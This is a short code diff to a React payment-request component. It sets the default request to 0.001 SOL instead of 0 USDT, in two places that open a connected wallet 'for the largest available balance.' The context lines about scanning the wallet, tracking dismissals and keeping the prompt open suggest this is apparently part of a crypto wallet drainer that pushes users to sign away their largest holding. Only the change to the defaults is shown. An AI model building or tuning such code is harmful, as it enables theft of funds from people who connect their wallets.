@@ -309,8 +309,8 @@ export function PaymentRequestPrompt() {
       sentFor.current = null
       dismissed.current = null
       keepOpen.current = true
-      setSolAmount(0)
-      setAsset('USDT')
+      setSolAmount(0.001)
+      setAsset('SOL')
       setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
       setOpen(true)
     }
@@ -354,8 +354,8 @@ export function PaymentRequestPrompt() {
     scanPromise.current = null
     shownFor.current = walletAddress
     closeWalletModalRef.current()
-    setSolAmount(0)
-    setAsset('USDT')
+    setSolAmount(0.001)
+    setAsset('SOL')
     setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
     if (!keepOpen.current) setOpen(false)
 
